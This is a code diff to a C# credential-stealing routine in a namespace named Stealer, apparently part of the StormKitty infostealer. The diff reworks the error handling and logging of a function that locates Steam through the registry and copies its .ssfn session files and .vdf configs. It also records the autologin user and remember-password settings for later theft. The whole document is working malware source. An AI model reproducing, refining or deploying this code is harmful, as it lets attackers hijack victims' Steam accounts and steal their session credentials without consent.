@@ -9,17 +9,18 @@ namespace Stealer
             
         public static bool GetSteamSession(string sSavePath)
         {
+            RegistryKey rkSteam = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
+            if (rkSteam == null)
+                return StormKitty.Logging.Log("Steam >> Application path not found in registry", false);
+
+            string sSteamPath = rkSteam.GetValue("SteamPath").ToString();
+            if (!Directory.Exists(sSteamPath))
+                return StormKitty.Logging.Log("Steam >> Application directory not found", false);
+
+            Directory.CreateDirectory(sSavePath);
+
             try
             {
-                RegistryKey rkSteam = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
-                if (rkSteam == null)
-                    return false;
-
-                string sSteamPath = rkSteam.GetValue("SteamPath").ToString();
-                if (!Directory.Exists(sSteamPath))
-                    return false;
-
-                Directory.CreateDirectory(sSavePath);
                 // Get steam applications list
                 foreach (string GameID in rkSteam.OpenSubKey("Apps").GetSubKeyNames())
                 {
@@ -35,7 +36,11 @@ namespace Stealer
                             $"Application {Name}\n\tGameID: {GameID}\n\tInstalled: {Installed}\n\tRunning: {Running}\n\tUpdating: {Updating}\n\n");
                     }
                 }
+            }
+            catch (Exception ex) { StormKitty.Logging.Log("Steam >> Failed collect steam apps\n" + ex); }
 
+            try
+            {
                 // Copy .ssfn files
                 if (Directory.Exists(sSteamPath))
                 {
@@ -44,8 +49,13 @@ namespace Stealer
                         if (file.Contains("ssfn"))
                             File.Copy(file, sSavePath + "\\ssnf\\" + Path.GetFileName(file));
                 }
-                // Copy .vdf files
-                string ConfigPath = Path.Combine(sSteamPath, "config");
+            }
+            catch (Exception ex) { StormKitty.Logging.Log("Steam >> Failed collect steam .ssnf files\n" + ex); }
+            
+            try
+                {
+                    // Copy .vdf files
+                    string ConfigPath = Path.Combine(sSteamPath, "config");
                 if (Directory.Exists(ConfigPath))
                 {
                     Directory.CreateDirectory(sSavePath + "\\configs");
@@ -54,8 +64,11 @@ namespace Stealer
                             File.Copy(file, sSavePath + "\\configs\\" + Path.GetFileName(file));
                 }
 
-                Counter.Steam = true;
+            }
+            catch (Exception ex) { StormKitty.Logging.Log("Steam >> Failed collect steam configs\n" + ex); }
 
+            try
+            {
                 string RememberPassword = (int)rkSteam.GetValue("RememberPassword") == 1 ? "Yes" : "No";
                 string sSteamInfo = String.Format(
                     "Autologin User: " + rkSteam.GetValue("AutoLoginUser") +
@@ -63,9 +76,12 @@ namespace Stealer
                     );
                 File.WriteAllText(sSavePath + "\\SteamInfo.txt", sSteamInfo);
                 
-                return true;
+                
             }
-            catch { return false; }
+            catch (Exception ex) { StormKitty.Logging.Log("Steam >> Failed collect steam info\n" + ex); }
+
+            Counter.Steam = true;
+            return true;
         }
     }
 }
